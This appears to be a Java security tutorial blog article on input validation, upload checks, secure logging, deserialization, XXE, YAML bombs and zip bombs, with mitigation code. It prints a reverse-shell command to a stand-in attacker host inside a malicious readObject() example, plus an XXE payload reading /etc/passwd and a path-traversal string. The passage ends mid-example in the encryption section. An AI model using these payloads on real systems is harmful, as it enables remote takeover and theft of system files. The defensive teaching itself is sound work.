# Core Application Security for Java Developers

## Content

- [Securing Resource Access via UUIDs](#securing-resource-access-via-uuids)
  - [How to Generate UUIDs](#how-to-generate-uuids)
- [Input Data Validation and Sanitization](#input-data-validation-and-sanitization)
  - [Validation Techniques](#validation-techniques)
  - [Sanitization Techniques](#sanitization-techniques)
- [Handling Input Files from Public Sources or External Clients](#handling-input-files-from-public-sources-or-external-clients)
- [Security Logging Best Practices](#security-logging-best-practices)
- [Java Deserialization](#java-deserialization)
  - [Java Deserialization Attack](#java-deserialization-attack)
  - [XML External Entity (XXE)](#xml-external-Entity-xxe)
  - [YAML Nested Anchors and Aliases](#yaml-nested-anchors-and-aliases)
  - [Zip Bomb](#zip-bomb)
- [Symmetric and Asymmetric Encryption](#symmetric-and-asymmetric-encryption)
  - [Symmetric Encryption](#symmetric-encryption)
  - [Asymmetric Encryption](#asymmetric-encryption)
- [Hashing](#hashing)
- [Secure Configuration and Secrets Management](#secure-configuration-and-secrets-management)
- [Keeping JDK Versions and Libraries Up to Date](#keeping-jdk-versions-and-libraries-up-to-date)
- [References](#references)

---

🔒 This article is tailored for Java developers to understand the core mechanisms used to secure the Java process. It covers security measures that can be implemented internally after the service receives a request from an external client, focusing on areas such as securing resource access, input validation, symmetric and asymmetric encryption, hashing, secure configuration of secrets, logging, and deserialization vulnerabilities.

📚 It is part of a series of security-related articles for Java developers. 
I highly recommend checking out the others for a more comprehensive understanding:
- [API Web Application Security for Java Developers](https://ionutbalosin.com/2025/03/api-web-application-security-for-java-developers): Covers key security aspects to secure the Java application surface and APIs (e.g., authentication and authorization), and how Java applications can enhance the security of web or single-page applications (e.g., Content Security Policy, HTTP security headers).
- [Security Application Testing for Java Developers](https://ionutbalosin.com/2025/03/security-application-testing-for-java-developers): Covers the main security testing tools that can be integrated to assess flaws in Java applications both statically and at runtime, including Software Composition Analysis (SCA), Static Application Security Testing (SAST), Dynamic Application Security Testing (DAST), and Penetration Testing (PenTest).

## Securing Resource Access via UUIDs

Exposing internal resources to external clients via a Universally Unique Identifier (UUID) makes it hard to guess or predict them. In contrast, sequential or simple IDs (e.g., `1`, `2`, `3`, etc.,) expose resources to enumeration attacks and increase the likelihood that an attacker could guess and randomly access unwanted resources.

This is particularly important when exposing resources via RESTful APIs over HTTP to external clients.

For example, for an API like:

```
  GET /pizza/orders/{orderId}
```

using a UUID format for the `orderId` URL parameter:

```
  GET /pizza/orders/e45042cf-e6aa-4e23-990f-8fbd8c83-610a
```

is much harder to guess compared to using a simple integer:

```
  GET /pizza/orders/123
```

Source: [API definition file](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-api/src/main/resources/service-api.yaml)

While UUIDs typically require more storage space and add performance overhead, they provide a more secure method for identifying resources.

### How to Generate UUIDs

To generate UUIDs, there are multiple options, as described below:

1. **At the application level**: UUIDs can be generated explicitly in the code by software engineers.

For example, in Java, you can generate a version 4 UUID using the `java.util.UUID` class:

```java
  // Java
  UUID orderId = UUID.randomUUID();
```

2. **At the database level**: Alternatively, and often more efficiently, if the resource is stored in a database, you can leverage database-generated UUIDs.

Many modern databases, like PostgreSQL, can generate UUIDs natively. This approach can simplify your application code and ensure UUIDs are unique across your database.

```
  -- PostgreSQL
  orderId UUID DEFAULT uuid_generate_v4()
```

## Input Data Validation and Sanitization

These two concepts are fundamental when it comes to input data handling and can be defined as follows:

1. **Validation**: Ensures the input meets expected formats and constraints (e.g., length, type, range, expected values, etc.).
2. **Sanitization**: Modifies input to ensure it is safe for further processing (e.g., escaping or encoding special characters).

### Validation Techniques

Validation techniques become easier to implement in the case of RESTful APIs leveraging specifications like [OpenAPI](https://en.wikipedia.org/wiki/OpenAPI_Specification) or [Swagger](https://en.wikipedia.org/wiki/Swagger_(software)), since the DSL itself is rich and provides many validation criteria (e.g., `type`, `format`, `enum`, `minimum`, `maximum`, `minLength`, `maxLength`, `pattern`, etc.) that can be declared in the API definition, which is a significant advantage.

You can then use an [OpenAPI Generator](https://github.com/OpenAPITools/openapi-generator) or [Swagger Codegen](https://github.com/swagger-api/swagger-codegen) to generate the models and interfaces, with all of these constraints included in the generated source code, in an API-Driven Development fashion, which I highly recommend.

Below are the most important validation techniques.

**Whitelisting**: Allows only valid, predefined input values. This approach is strongly recommended compared to blacklisting (see below).

A few examples:

- Let's suppose the user wants to upload some files via a web UI. In this case, whitelisting implies allowing only specific file types (e.g., `.txt`, `.json`) to be uploaded by a user, as in the configuration below:

    ```properties
      # Application properties
      file.upload.allowed-extensions=txt,json
    ```

-  Another example is to use `enum` values instead of free-form strings as in the API definition below:

    ```yaml
      # OpenAPI definition
      PizzaOrderStatus:
        type: string
        enum:
          - initiated
          - in_preparation
          - in_delivery
          - delivered
    ```

**Blacklisting**: In contrast to whitelisting, blacklisting blocks specific known bad inputs. It is less reliable and not recommended.

- In the example above, blocking specific dangerous file types (e.g., `.exe`) from being uploaded is less secure as new or other types (e.g., malicious `.zip` files) may bypass the filter and endanger the system.

    ```properties
      # Application properties
      file.upload.denied-extensions=exe
    ```

**Regular Expressions**: Use for pattern matching to enforce format constraints (e.g., emails, phone numbers).

A few examples: 
- Use an email regex for all email input fields in a web UI.
- Use a phone number regex instead of a free-text input.

In this API definition, you can see the regex patterns for both emails and phone numbers:

```yaml
  # OpenAPI definition
  Customer:
    type: object
    properties:
      email:
        type: string
        description: Email address of the customer.
        maxLength: 128
        # Email regex
        pattern: ^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$
        example: "john.doe@customer.com"
      phoneNumber:
        type: string
        description: Phone number of the customer, including country code.
        maxLength: 16
        # Phone number regex
        pattern: '^\+?\d{1,3}?[-.\s]?\(?\d{1,4}?\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}$'
        example: "+4366412345678"
```
Source: [API definition file](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-api/src/main/resources/service-api.yaml)

**Type Validation**: Ensure input matches the expected data types (e.g., numeric, date, etc.). Allowing everything to be a string might be too open-ended.

**Range Validation**: For numbers or dates, ensure they are within acceptable ranges.

**Length and Size Validation**: Prevent buffer overflows or excessively large input (e.g., limiting input length for fields). 
This is especially important for arrays or free-form text where limiting the length or size is crucial.

In this API definition, you can see the type, range, length, and size validation rules:

```yaml
  # OpenAPI definition
  
  Order:
    type: object
    properties:
      orders:
        # Type validation
        type: array
        # Size validation
        minItems: 1
        maxItems: 32
        items:
          $ref: '#/components/schemas/OrderItem'
      customer:
        $ref: '#/components/schemas/Customer'
        
  OrderItem:
    type: object
    properties:
      quantity:
        # Type validation
        type: integer
        description: Number of pizza being ordered.
        example: 3
        # Range validation
        minimum: 1
        maximum: 12

  Customer:
    type: object
    properties:
      specialRequest:
        # Type validation
        type: string
        description: Special requests from the customer regarding their order.
        # Length validation
        maxLength: 1024
        example: "I would like extra cheese and a thinner crust. I'm quite hungry, so please deliver it as soon as possible. I usually give extra tips."
```

Source: [API definition file](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-api/src/main/resources/service-api.yaml)

### Sanitization Techniques

Below are the most important sanitizations techniques.

**Encoding Data**: Encode data to ensure it is safe for further processing and storage.

A few examples:
- HTML Encoding prevents Cross-site scripting (XSS) by encoding special characters like `<`, `>`, `&`, etc.
- URL Encoding handles special characters in URLs (e.g., spaces, slashes).
- Base64 Encoding converts binary data into a text format using a base 64 representation, allowing binary data (like images or PDF files) to be safely transmitted in text-based formats (e.g., JSON, XML).

In this Java code snapshot, the user input is HTML encoded:

```java
  public void sanitizeSpecialRequest(Order order) {
    ofNullable(order.getCustomer())
      .map(Customer::getSpecialRequest) // Unsafe input
      .map(HtmlUtils::htmlEscape)       // Encoded output
      .ifPresent(sanitizedSpecialRequest ->
        order.getCustomer().setSpecialRequest(sanitizedSpecialRequest));
  }
```

**Escaping Special Characters**: Ensure special characters are properly escaped to prevent injection attacks (e.g., SQL injection, XSS).

Example:
- SQL Escaping prevents SQL injection by escaping special characters like single quotes. However, parameterized queries (i.e., prepared statements) are more secure, as they separate query logic from user input.

In this Java code snapshot, the `org.springframework.jdbc.core.JdbcTemplate` is used to execute database queries:

```java
  private final JdbcTemplate jdbcTemplate;
    
  public void insertPizzaOrder(String customerName, String sanitizedSpecialRequest) {
    // Parameterized queries to prevent SQL injection
    final String query = "INSERT INTO orders (customer_name, special_request) VALUES (?, ?)";
    jdbcTemplate.update(query, customerName, sanitizedSpecialRequest);
  }
```

## Handling Input Files from Public Sources or External Clients

> **Rule of thumb:** Assume that any input file from a public or external client source can be potentially malicious.

Below are the most important factors to consider when dealing with files that are uploaded to our system by clients or users from the public internet.

**Input Type Validation:** Validate file types and contents before processing to ensure they meet expected formats and predefined rules.

**File Size Limits:** Enforce limits on input file sizes to prevent denial-of-service attack and resource exhaustion.

**Sanitize File Names:** Avoid directly using untrusted file names. Sanitize the input to protect against path traversal attacks (e.g., `/var/www/reports/../../../etc/passwd`).

**Scan for Malware:** Integrate malware scanning solutions for files that may be malicious (e.g., user uploads) to detect and mitigate potential threats.
Note that the integration with a malware SaaS is out of scope for this article.

Below are the basic configuration properties for file uploads:

```properties
  # Application properties
  file.upload.max-size=15728640
  file.upload.max-filename-length=255
  file.upload.allowed-extensions=txt,json
```

And the Java source code that implements the input file checks:

```java
    @Service
    public class UploadFileValidator {
    
      private static final String CURRENT_DIR = System.getProperty("user.dir", ".");
    
      @Value("${file.upload.max-size}")
      private Integer fileMaxSize;
    
      @Value("${file.upload.max-filename-length}")
      private Integer fileNameMaxLength;
    
      @Value("#{'${file.upload.allowed-extensions}'.split(',')}")
      private Set<String> allowedExtensions;
    
      private final Tika tika;
    
      public UploadFileValidator() {
        this.tika = new Tika();
      }
    
      /**
       * This method checks whether the uploaded file meets specific criteria such as size, name length,
       * allowed file extensions, and valid MIME type (JSON or plain text).
       */
      public void validate(MultipartFile uploadFile) {
        final String filename = uploadFile.getOriginalFilename();
    
        validateFilenameLength(filename);
        validateFileExtension(filename);
        validateFileSize(uploadFile, filename);
        validateFileMimeType(uploadFile, filename);
        validatePathTraversal(filename);
      }
    
      private void validateFileSize(MultipartFile uploadFile, String filename) {
        if (uploadFile.getSize() > fileMaxSize) {
          throw new SecurityException(
              format(
                  "File size %s (bytes) is larger than the allowed size %s (bytes).",
                  uploadFile.getSize(), fileMaxSize));
        }
    
        if (uploadFile.getSize() == 0) {
          throw new SecurityException(format("File %s is empty.", filename));
        }
      }
    
      private void validateFilenameLength(String filename) {
        if (filename == null || filename.length() > fileNameMaxLength) {
          throw new SecurityException(
              format(
                  "File name length %s exceeds the maximum allowed length of %s.",
                  filename.length(), fileNameMaxLength));
        }
      }
    
      private void validateFileExtension(String filename) {
        final String fileExtension = getFileExtension(filename);
        if (!allowedExtensions.stream()
            .anyMatch(allowedExtension -> fileExtension.equalsIgnoreCase(allowedExtension))) {
          throw new SecurityException(format("File extension %s is not allowed.", fileExtension));
        }
      }
    
      private void validateFileMimeType(MultipartFile uploadFile, String filename) {
        try {
          final String mimeType = tika.detect(uploadFile.getInputStream());
          if (!mimeType.equals("application/json") && !mimeType.equals("text/plain")) {
            throw new SecurityException(format("File MIME type %s is not allowed.", mimeType));
          }
        } catch (IOException e) {
          throw new RuntimeException(e);
        }
      }
    
      /**
       * Validates the specified filename to prevent path traversal attacks.
       *
       * <p>This method checks whether the canonical path of the given filename starts with the base
       * directory's canonical path. If it does not, this may indicate a potential path traversal
       * attempt, and access to files outside the intended directory structure is denied.
       *
       * <p>Path Traversal Attack Example:
       *
       * <p>Suppose CURRENT_DIR is "/uploads". A malicious user could attempt to access sensitive files
       * by providing the following filename: "../../etc/passwd".
       */
      private void validatePathTraversal(String filename) {
        try {
          final File file = new File(CURRENT_DIR, filename);
          final String canonicalPath = file.getCanonicalPath();
          final String baseCanonicalPath = new File(CURRENT_DIR).getCanonicalPath();
    
          if (!canonicalPath.startsWith(baseCanonicalPath)) {
            throw new SecurityException(
                format(
                    "Path traversal detected for filename: %s. Access to the file is not allowed.",
                    filename));
          }
    
        } catch (IOException e) {
          throw new RuntimeException("Error while validating file path: " + e.getMessage(), e);
        }
      }
    
      private String getFileExtension(String fileName) {
        return ofNullable(fileName)
            .filter(name -> name.contains("."))
            .map(name -> name.substring(name.lastIndexOf(".") + 1))
            .orElseThrow(
                () ->
                    new RuntimeException(
                        format("Could not identify file extension for '%s'", fileName)));
      }
    }

```

Source: [UploadFileValidator.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-service/src/main/java/ionutbalosin/training/application/security/practices/pizza/order/service/validator/UploadFileValidator.java)

The [Apache Tika](https://tika.apache.org) library is used to detect if the uploaded file type corresponds to the file content itself.

## Security Logging Best Practices

**Avoid Logging Sensitive Data:** Never log Personally Identifiable Information (PII) or Payment Information (PI).
If necessary, mask or encrypt it to comply with regulations (e.g., General Data Protection Regulation - GDPR). 

A few examples of logs that contain sensitive PI/PII data and should therefore be avoided:

```
  ❌ 08:15:22.123 INFO User registration successful with email: john.doe@keycloak.com
  ❌ 09:17:22.476 INFO Payment processed successfully for Card Number: 1111-2222-3333-4444, Expiry Date: 12/31, CVV: 123, with Amount: €100.00
  ❌ 10:06:29.476 INFO User john.doe@keycloak.com updated their profile: 123 Main St, Vienna, Austria, Phone Number: (664) 123-456-789
```

A few examples of logs that do not contain sensitive PI/PII data and are therefore acceptable:

```
  ✅ 08:15:22.476 INFO User registration successful for user ID f47ac10b-58cc-4372-a567-0e02b2c3d479
  ✅ 09:17:22.678 INFO Payment processed successfully for Card Number: [MASKED, ****-****-****-4444], Expiry Date: 12/31, CVV: [MASKED, ***], with Amount: €100.00
  ✅ 10:06:29.451 INFO User ID f47ac10b-58cc-4372-a567-0e02b2c3d479 updated their profile successfully. New address: [MASKED, Vienna, Austria], Phone Number: [MASKED, (664) 123-***-***]
```

**Include Contextual Logging Information:** Log details such as remote host, remote port, user ID, resource accessed, user agent, etc. for better analysis.

Especially when dealing with requests from external public clients, particularly via RESTful APIs over HTTP calls, it is crucial to log key request details.In case of an attack, you need to identify where the request came from, who initiated the request, and what resource was affected in our system by that request.

A few examples of logs containing security contextual information are:

```
  06:01:39.476 [http-nio-8080-exec-2] [RemoteHost=192.168.65.1, RemotePort=30888, UserId=720a2f16-de10-4dd3-84cd-1b9424c3ad48, RequestMethod=POST, UserAgent=PostmanRuntime/7.33.0, RequestURI=/pizza/orders] INFO Pizza order '2504107a-d474-44c8-aae2-91abb577b9b8' has been successfully sent for cooking.
  06:01:40.947 [http-nio-8080-exec-1] [RemoteHost=172.29.0.4, RemotePort=56226, UserId=c5c9f9af-d95c-4816-b9ad-d21c4da76463, RequestMethod=POST, UserAgent=Java/21.0.5, RequestURI=/pizza/delivery/orders] INFO Pizza order 'f39fba32-ce86-4021-a236-e21b4ffdbfc5' has been successfully delivered.
```

The best way to automatically incorporate these additional security parameters is to use the logger's Mapped Diagnostic Context (MDC) in an HTTP request handler interceptor. This ensures that all application requests pass through it and that the parameters are automatically available to the logger.

The code snapshot below is an example of how such an HTTP request handler interceptor could be configured to set the MDC values.

```java
  /**
   * This class effectively captures critical information such as the remote host, user ID,
   * correlation ID, HTTP request method, HTTP request URI, user agent, and response status. This
   * information is essential for tracking user actions, identifying potential security issues, and
   * troubleshooting. It stores this data in the Mapped Diagnostic Context (MDC), providing context in
   * log outputs, facilitating traceability, and enhancing the overall observability of the
   * application.
   */
  @Component
  public class LoggerInterceptor implements HandlerInterceptor {

    private static final String REMOTE_HOST = "RemoteHost";
    private static final String REMOTE_PORT = "RemotePort";
    private static final String USER_ID = "UserId";
    private static final String CORRELATION_ID = "CorrelationId";
    private static final String REQUEST_METHOD = "RequestMethod";
    private static final String REQUEST_URI = "RequestURI";
    private static final String USER_AGENT = "UserAgent";
    private static final String RESPONSE_STATUS = "ResponseStatus";

    @Override
    public boolean preHandle(
      HttpServletRequest request, HttpServletResponse response, Object handler) {
      // Add the remote host
      final String remoteHost = request.getRemoteAddr();
      MDC.put(REMOTE_HOST, remoteHost);
    
      // Add the remote port
      final String remotePort = String.valueOf(request.getRemotePort());
      MDC.put(REMOTE_PORT, remotePort);
    
      // Add the user ID
      final String userId =
      (request.getUserPrincipal() != null) ? request.getUserPrincipal().getName() : "anonymous";
      MDC.put(USER_ID, userId);
    
      // Add the correlation ID
      String correlationId = request.getHeader(CORRELATION_ID);
      if (correlationId == null || correlationId.isEmpty()) {
        correlationId = UUID.randomUUID().toString();
      }
      MDC.put(CORRELATION_ID, correlationId);
    
      // Add the request method
      String requestMethod = request.getMethod();
      MDC.put(REQUEST_METHOD, requestMethod);
    
      // Add the HTTP request URI
      String requestURI = request.getRequestURI();
      MDC.put(REQUEST_URI, requestURI);
    
      // Add the user agent
      String userAgent = request.getHeader("User-Agent");
      MDC.put(USER_AGENT, userAgent != null ? userAgent : "unknown");
    
      return true;
    }
  }
```

Source: [LoggerInterceptor.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/security-slf4j-logger-enricher/src/main/java/ionutbalosin/training/application/security/practices/slf4j/logger/enricher/LoggerInterceptor.java)

Of course, managing the MDC logger within the HTTP request handler interceptor applied to every incoming request will impact application performance. However, for critical or mission-critical systems that are publicly exposed, identifying and mitigating external attacks is crucial, and this approach pays off.

**Monitor for Anomalies:** Set up monitoring to detect unusual activities, such as repeated failed logins or transactions from different regions. **Security Information and Event Management (SIEM)** systems are very helpful for this purpose.
However, this topic is beyond the scope of this article, as implementing a SIEM is typically done at a higher level, usually company-wide.

## Java Deserialization

While Java deserialization attacks are not the most common security threats, they can dramatically harm the application if successfully executed.

### Java Deserialization Attack

An example of a classical Java deserialization attack is when an attacker creates a malicious class (e.g., `MaliciousClazz`) containing a harmful `readObject()` method. 

[![Remote Code Execution with Java Deserialization.svg](https://github.com/ionutbalosin/java-application-security-practices/blob/main/docs/images/remote_code_execution.svg?raw=true)](https://github.com/ionutbalosin/java-application-security-practices/blob/main/docs/images/remote_code_execution.svg?raw=true)

When the `MaliciousClazz` is deserialized, the `readObject()` method is executed, causing harmful actions on the attacker's machine.

The malicious Java payload can reach the server through various mechanisms, including HTTP requests/responses, file uploads, third-party libraries, inter-service communication, configuration files, and more.

The code snapshot below provides an example of such a malicious class.

```java
  public class MaliciousClazz implements Serializable {
    
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
      ois.defaultReadObject();

      // Attacker crafts a malicious command to be executed 💀
      String maliciousCommand = "/bin/bash -c 'exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'";
      Runtime.getRuntime().exec(maliciousCommand);
    }
  }
```

For example, the [Log4j Log4Shell vulnerability](https://en.wikipedia.org/wiki/Log4Shell) was essentially a Java deserialization attack that allowed a remote attacker to gain control over the victim's machine.

### How to Mitigate or Prevent Java Deserialization Attacks

Deserializing Java classes from external sources can be extremely dangerous. Similar to handling external input files, you must assume that any deserialized class from a public or external client source can potentially be malicious.

Let's look at this example. Suppose an attacker extends one of the application's classes (e.g., `TrustedClazz`) with a malicious version (e.g., `MaliciousClazz`) and sends it to the server.

```java
  // A trusted class, generally created by application developers or a trusted third-party library owner
  public class TrustedClazz implements Serializable {
    // ...
  }

  // A malicious class typically created by the attacker
  public class MaliciousClazz extends TrustedClazz {
    
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
      ois.defaultReadObject();
       
      // Attacker crafts a malicious command to be executed 💀
      String maliciousCommand = "...";
      Runtime.getRuntime().exec(maliciousCommand);
    }
  }
```

When `TrustedClazz` is deserialized on the server, the `readObject()` method of `MaliciousClazz` is executed as well (as part of the class hierarchy), causing harmful actions on the attacker's machine.

```java
  try (final ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
    final TrustedClazz trustedClazz = (TrustedClazz) ois.readObject();
    // The malicious command is not executed anymore 💀
  } catch (IOException | ClassNotFoundException e) {
    // ...
  }
```

The default deserialization mechanism does not prevent the deserialization of malicious classes because the JVM runtime lacks contextual information.
However, there are two useful alternatives to mitigate or prevent this:

1. **Deserialize using the Java input filter:** Restrict deserialization to only known, trusted or expected classes, thereby preventing any other unknown and potentially malicious classes from being deserialized.
  This mechanism was introduced with [JEP 290: Filter Incoming Serialization Data](https://openjdk.org/jeps/290) and further enhanced by [JEP 415: Context-Specific Deserialization Filters](https://openjdk.org/jeps/415)

    ```java
      try (final ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
      // Create a filter that allows deserialization of TrustedClazz class and rejects all others.
      // The filter string format: <class name>;!* (allow TrustedClazz, reject all other classes).
        final ObjectInputFilter filesOnlyFilter = ObjectInputFilter.Config.createFilter(TrustedClazz.class.getName() + ";!*");
        ois.setObjectInputFilter(filesOnlyFilter);
        // Deserialize the object, expecting it to be of type TrustedClazz
        final TrustedClazz trustedClazz = (TrustedClazz) ois.readObject();
        // The malicious command is not executed anymore ✅
      } catch (IOException | ClassNotFoundException e) {
        // ...
      }
    ```

2. **Deserialize using Apache Commons validation library**

    ```java
      try (final FileInputStream fis = new FileInputStream(filename);
      final ValidatingObjectInputStream vois = new ValidatingObjectInputStream(fis)) {
        // Only allow specific trusted classes (e.g., TrustedClazz) to be deserialized
        vois.accept(TrustedClazz.class);
        // Deserialize the object (only allowed classes can be deserialized)
        final TrustedClazz trustedClazz = (TrustedClazz) vois.readObject();
        // The malicious code does not run anymore ✅ 
      } catch (IOException | ClassNotFoundException e) {
        // ...
      }
    ```

Source: [MaliciousClazzDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/clazz/MaliciousClazzDeserializer.java)

### Key Takeaways

- Avoid deserializing data from untrusted or unknown sources.
- Restrict which classes can be deserialized using filters. In JDK 9 and later, use `ObjectInputFilter` to specify allowed objects. Additionally, libraries like `Apache Commons` provide mechanisms to define rules for allowed objects during deserialization.

## XML External Entity (XXE)

An XML External Entity (XXE) attack occurs when an application processes XML input containing a reference to an external entity using a weakly configured XML parser.

For example, let's imagine your Java application receives the following XML file as input from an attacker:

```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>
```

Source: [xml_external_entity.xml](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/resources/xml_external_entity.xml)

This is extremely dangerous because the XXE reference allows reading the sensitive `/etc/passwd` file on the victim machine.

**Note:** Historically, many Java XML parsers have XXE enabled by default, which can make them vulnerable to XXE injection attacks. However, it's important to check the specific parser and version you are using, as newer versions may have addressed this issue by disabling XXE processing by default.

Below is a code snapshot example using the `SAXParser`, that has XXE enabled by default.

```java
  final SAXParserFactory factory = SAXParserFactory.newInstance();
  final XMLReader saxReader = factory.newSAXParser().getXMLReader();

  // Parse the XML file
  try (InputStream is = new FileInputStream(filename)) {
    // XXE attack could lead to leakage of sensitive information 💀
    saxReader.parse(new InputSource(is));
  }
```

### How to Mitigate or Prevent XXE Attacks

The safest way to prevent XXE attacks is to **completely disable DTDs and external entities**.

```java
  final SAXParserFactory factory = SAXParserFactory.newInstance();
  // Disable DTDs and external entities for XXE protection
  factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false); 
  
  final XMLReader saxReader = factory.newSAXParser().getXMLReader();

  // Parse the XML file
  try (InputStream is = new FileInputStream(filename)) {
    // XXE attack is prevented ✅
    saxReader.parse(new InputSource(is));
  }
```

Source: [XmlXxeDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/xml/XmlXxeDeserializer.java)

## YAML Nested Anchors and Aliases

YAML anchors (`&`) and aliases (`*`) allow a value defined elsewhere in the document to be reused, enabling a YAML file to contain deeply nested structures.

By exploiting this mechanism, an attacker could create a deeply nested structure of references that, while being parsed by the application, may consume excessive CPU or memory, potentially causing the application to crash or become temporarily unavailable. This makes it a potential vector for denial-of-service (DoS) attacks.

An example of a YAML file containing deeply nested references is shown below:

```yaml
  a: &a [_, _, _, ...]
  b: &b [*a, *a, *a, ...]
  c: &c [*b, *b, *b, ...]
  d: &d [*c, *c, *c, ...]
  # ...
  z: &z [*y, *y, *y, ...]

  user:
    - firstname: Luna
      lastname: Skywalker
      username: luna_sky99
      comment: Aspiring space traveler and coffee lover
    - firstname: Bomb
      lastname: Hunter
      username: crack_the_heap
      metadata: *z
```

Source: [yaml_bomb.yaml](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/resources/yaml_bomb.yaml)

`SnakeYAML` is the most common and widely used library for parsing YAML in Java.
However, be careful, because versions of `SnakeYAML` prior to `1.26` are susceptible to the YAML bomb vulnerability. Starting from version `1.26`, this type of attack is prevented, as the library imposes a limit on the depth of nested structures.

To load the content of a YAML file using the `SnakeYAML` library, the code generally looks like this:

```java
  try (InputStream inputStream = new BufferedInputStream(new FileInputStream(CLASS_FILENAME))) {
    final Yaml yaml = new Yaml();
    final Map<String, Object> data = yaml.load(inputStream);
    // YAML bomb might be triggered here 💀
    final List<User> users = (List<User>) data.get("user");
    // ...
  } catch (IOException e) {
    // ...
  } 
```

Source: [YamlBombDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/yaml/YamlBombDeserializer.java)

### How to Mitigate or Prevent YAML bomb

While parsing YAML files, it is important to check if the library you are using has a default limit on the depth of nested structures. If the library does not have such a limit, you should manually impose a limit on the depth of nested anchors to prevent deeply recursive structures.

## Zip Bomb

A zip bomb is an apparently small, maliciously crafted zip file (e.g., a few kilobytes) that expands to a massively larger size when decompressed (e.g., gigabytes or even terabytes). 
Some zip bombs can even evade antivirus detection due to the way they are crafted.

When reading, parsing, or extracting a zip file in a Java application, it is important to enforce strict limits to prevent potential zip bombs from crashing your application. These safeguards could include:
- Restricting the maximum uncompressed size.
- Limiting the number of zip entries.
- Controlling the nesting depth for recursive extraction.

The Java code snapshot below shows how these limits could be implemented:

```java
  private static final long MAX_UNCOMPRESSED_SIZE = 1024 * 1024 * 1024; // Max allowed uncompressed size (1 GB)
  private static final int MAX_ENTRIES = 10_000; // Max allowed entries
  private static final int MAX_NESTING_DEPTH = 20; // Max allowed nesting depth

  public static void extractZipFile(File file, int depth) throws IOException {
    if (depth > MAX_NESTING_DEPTH) {
      throw new IOException("Max zip nesting depth exceeded. Possible zip bomb!");
    }

    try (ZipFile zipFile = new ZipFile(file)) {
      final Enumeration<? extends ZipEntry> entries = zipFile.entries();
      long totalUncompressedSize = 0;
      int entryCount = 0;

      while (entries.hasMoreElements()) {
        ZipEntry entry = entries.nextElement();

        if (entryCount++ > MAX_ENTRIES) {
          throw new IOException("Max zip entries exceeded. Possible zip bomb!");
        }

        if (!entry.isDirectory()) {
          long entrySize = entry.getSize();
          if (entrySize < 0) {
            entrySize = 0;
          }
          totalUncompressedSize += entrySize;

          if (totalUncompressedSize > MAX_UNCOMPRESSED_SIZE) {
            throw new IOException("Max uncompressed zip size exceeded. Possible zip bomb!");
          }

          if (entry.getName().endsWith(".zip")) {
            final File nestedZip = new File(entry.getName());
            try (InputStream is = zipFile.getInputStream(entry)) {
              Files.copy(is, nestedZip.toPath());
            }
            try {
              extractZipFile(nestedZip, depth + 1);
            } finally {
              // Ensure cleanup in case of failure
              nestedZip.delete();
            }
          } else {
            // Extracting zip entry, simulate reading
            // ...
            }
          }
        }
      }
    }
  }
```

Source: [ZipBombDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/zip/ZipBombDeserializer.java)

## Symmetric and Asymmetric Encryption

Symmetric and asymmetric encryption are essential techniques for securing sensitive data.

I will not go into many details about symmetric and asymmetric encryption but will focus mainly on the most important considerations to guide us when developing an application.

### Symmetric Encryption

Symmetric encryption is faster than asymmetric encryption and uses a single key for both encryption and decryption. 
Key management is crucial in symmetric encryption and requires secure practices to prevent key leaks. 
Services like Amazon Key Management Service (KMS), Azure Key Vault, Google Secret Manager, and HashiCorp Vault can help manage this effectively.

#### When to Use It

- **Encrypting Files**: Symmetric encryption is ideal for encrypting individual files or collections of files, ensuring that the data within these files remains confidential.
- **Encrypting Databases**: Large databases containing sensitive information can be encrypted using symmetric encryption to protect the data from unauthorized access.
- **Encrypting Disk Partitions**: Entire disk partitions can be encrypted to secure all data stored on the disk, making it unreadable without the correct encryption key.

#### What Algorithms to Use
- **AES (Advanced Encryption Standard)**: OWASP recommends AES with at least `128-bit` keys, preferably `256-bit`, due to its enhanced security. Furthermore, using AES with modes like **GCM (Galois/Counter Mode)** or **CCM (Counter with CBC-MAC)** is better than using AES without any mode, as these modes provide extended confidentiality, integrity, and authenticity in a single, efficient operation. Using AES without any mode like GCM or CCM will provide confidentiality but not integrity or authenticity.

#### What Algorithms to Avoid
- **DES (Data Encryption Standard)** and **3DES (Triple DES)**: Vulnerable to security attacks and should be avoided.

Below is an example of encrypting and decrypting a file using AES `256-bit` encryption with GCM mode:

```java
  private static SecretKey generateKey() throws Exception {
    // Note: AES-256 offers a very high level of security. As of today, there are no practical
